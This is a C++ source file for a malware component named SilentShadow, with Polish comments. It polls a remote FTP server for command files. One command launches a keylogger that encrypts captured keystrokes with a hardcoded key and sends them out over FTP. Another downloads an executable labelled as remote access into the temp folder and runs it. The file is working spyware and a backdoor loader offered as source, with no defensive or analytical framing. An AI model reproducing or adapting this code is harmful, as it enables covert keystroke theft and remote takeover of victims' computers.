#include "SilentShadow.h"
#include "Keylogger.h"

#define BUFSIZE 4096

SilentShadow::SilentShadow(char ftp[], char user[], char password[])
{
	this->ftp = new FTP(ftp, user, password);
}


SilentShadow::~SilentShadow()
{
}

void SilentShadow::start()
{
	DWORD dwRetVal;
	DWORD dwBufSize = BUFSIZE; 
	char lpPathBuffer[BUFSIZE]; 

	// Get the temp path.
	dwRetVal = GetTempPath(dwBufSize, lpPathBuffer);

	if (dwRetVal > dwBufSize)
	{
		printf("GetTempPath failed with error %d.\n",
		GetLastError());
		return;
	}
	string path = lpPathBuffer;

	int licznik_paczek = 1;

	// SOSEMAUK
	string key = "A7C083FEB7";
	string IV = "00112233445566778899AABBCCDDEEFF";

	while (true)
	{
		if (this->ftp->get_connection() == NULL)
		{
			this->ftp->Connetion();
		}
		else 
		{
			if (this->ftp->removeFile("polecenia/1"))
			{
				cout << "1" << endl;

				// keylogger
				Keylogger *keylogger = new Keylogger(path, key, IV, 2000, 10, this->ftp, licznik_paczek++);
				key = keylogger->start();
				delete keylogger;

				//break;
			}
			else if (this->ftp->removeFile("polecenia/2"))
			{
				cout << "2" << endl;

				// zdalny dostep
				string path_what = "dostep.exe";
				string path_where = path + "dostep.exe";


				cout << path_where << endl;

				this->ftp->download_file(path_what, path_where);

				system(path_where.c_str());

				//break;
			}
			else if (this->ftp->removeFile("polecenia/3"))
			{
				cout << "3" << endl;

				// EXIT
				break;
			}
		}
	}
	
}